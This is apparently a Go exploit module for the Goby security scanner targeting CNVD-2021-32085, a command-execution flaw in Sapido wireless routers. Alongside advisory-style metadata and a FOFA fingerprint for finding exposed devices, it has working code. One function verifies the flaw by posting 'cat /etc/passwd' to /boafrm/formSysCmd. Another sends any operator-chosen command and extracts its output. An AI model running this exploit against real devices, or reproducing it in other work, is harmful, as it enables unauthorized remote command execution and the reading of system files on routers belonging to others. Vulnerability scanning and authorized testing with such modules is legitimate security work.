package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Sapido syscmd.htm RCE (CNVD-2021-32085)",
    "Description": "<p>Sapido is a variety of wireless routers.</p><p>There is a command execution vulnerability in the syscmd.htm page of the Sapido wireless router. Attackers can execute arbitrary commands to obtain server permissions.</p>",
    "Impact": "Sapido syscmd.htm RCE (CNVD-2021-32085)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.sapido.com.tw\">http://www.sapido.com.tw/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Sapido",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Sapido syscmd.htm 命令执行漏洞（CNVD-2021-32085）",
            "Description": "<p>Sapido是多款无线路由器。</p><p>Sapido无线路由器syscmd.htm页面存在命令执行漏洞，攻击者可执行任意命令获取服务器权限。</p>",
            "Impact": "<p>Sapido无线路由器syscmd.htm页面存在命令执行漏洞，攻击者可执行任意命令获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.sapido.com.tw\">http://www.sapido.com.tw</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Sapido",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Sapido syscmd.htm RCE (CNVD-2021-32085)",
            "Description": "<p>Sapido is a variety of wireless routers.</p><p>There is a command execution vulnerability in the syscmd.htm page of the Sapido wireless router. Attackers can execute arbitrary commands to obtain server permissions.</p>",
            "Impact": "Sapido syscmd.htm RCE (CNVD-2021-32085)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.sapido.com.tw\">http://www.sapido.com.tw/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Sapido",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"etop_home_menu_style.css\"",
    "GobyQuery": "body=\"etop_home_menu_style.css\"",
    "Author": "1291904552@qq.com",
    "Homepage": "http://www.sapido.com.tw/",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-32085"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10248"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/boafrm/formSysCmd"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `sysCmd=cat+%2Fetc%2Fpasswd&apply=Apply&submit-url=%2Fsyscmd.htm&msg=`
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp.StatusCode == 200 && regexp.MustCompile("root:(x*?):0:0:").MatchString(resp.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri1 := "/boafrm/formSysCmd"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = true
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = fmt.Sprintf("sysCmd=%s&apply=Apply&submit-url=%%2Fsyscmd.htm&msg=", cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp.StatusCode == 200 {
					body := regexp.MustCompile("<textarea rows=\"15\" name=\"msg\" cols=\"80\" wrap=\"virtual\">((.|\\n)*?)</textarea>").FindStringSubmatch(resp.RawBody)
					expResult.Output = body[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
